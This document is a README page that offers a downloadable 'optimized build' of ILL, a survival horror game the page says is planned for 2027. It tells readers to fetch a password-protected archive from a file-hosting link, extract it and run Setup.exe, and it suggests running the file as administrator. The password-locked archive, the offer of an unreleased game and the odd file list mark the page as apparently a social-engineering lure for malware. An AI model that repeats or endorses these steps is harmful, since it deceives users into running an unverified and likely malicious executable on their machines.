## 🕹️ About

ILL is a first-person action survival horror game from Team Clout. Set in a dark fort overtaken by a mysterious entity, it combines exploration, atmospheric storytelling, intense combat, and grotesque creatures. Players search for resources, manage inventory, craft and upgrade weapons, solve environmental puzzles, and face encounters ranging from isolated threats to bosses. The game is planned for PC, PlayStation 5, and Xbox Series X|S in 2027. This optimized build improves performance, startup time, frame pacing, and memory efficiency while preserving the original gameplay.

Designed for players who enjoy cinematic survival horror, intense first-person combat, exploration, and graphic body-horror atmosphere.

> 💡 This build includes performance improvements — faster startup and smoother frame pacing.

## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |
### Step 1: Download

You can download the build from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**. The archive contains everything you need to run the game.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder**.
3. Do not rename or move individual files — the build expects its folder structure intact.
4. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- license.wem <- Audio assets
|-- dlc.md5 <- DLC checksums
|-- update_1.res <- Update resources
|-- physics.sys <- Physics engine
|-- settings.bin <- Configuration
|-- lang.sys <- Language system
|-- api.pak <- API modules
|-- res.pak <- Resources archive
|-- update_1.ini <- Update config
|-- assets.wem <- Asset audio
|-- driver.umap <- Driver data
|-- scripts.lic <- Game scripts
|-- global.cfg <- Global settings
|-- localization.ini <- Language files
|-- animations.dll <- Animation system
|-- patch_1.bnk <- Audio banks
|-- uninstall.key <- Uninstall key
|-- audio.res <- Audio resources
|-- driver.pak <- Driver archive
|-- launcher.dll <- Launcher library
|-- license.bank <- License data
|-- bootstrap.wem <- Bootstrap audio
|-- installer.dat <- Installer data
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start.
3. Enjoy.

## ❓ Frequently Asked Questions (FAQ)

**Q: What does the optimized build change?**
**A:** The build focuses on smoother frame pacing, reduced memory usage, and faster startup. The gameplay itself is the same as the standard version.

**Q: Which platforms are supported?**
**A:** The build is published for Windows. See the platform table in the installation section for details.

**Q: What should I do if the game crashes?**
**A:** Try running the build as administrator and make sure your GPU drivers are up to date. If the issue persists, check the Issues tab for known problems and workarounds.

**Q: Can I share this build with others?**
**A:** Yes, you can share the link to this repository. Please don't reupload the build to other platforms — keeping distribution in one place makes updates easier to track.

**Q: Do I need to install anything else?**
**A:** No. The archive contains everything needed to run the game. Just extract it and launch the executable.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.
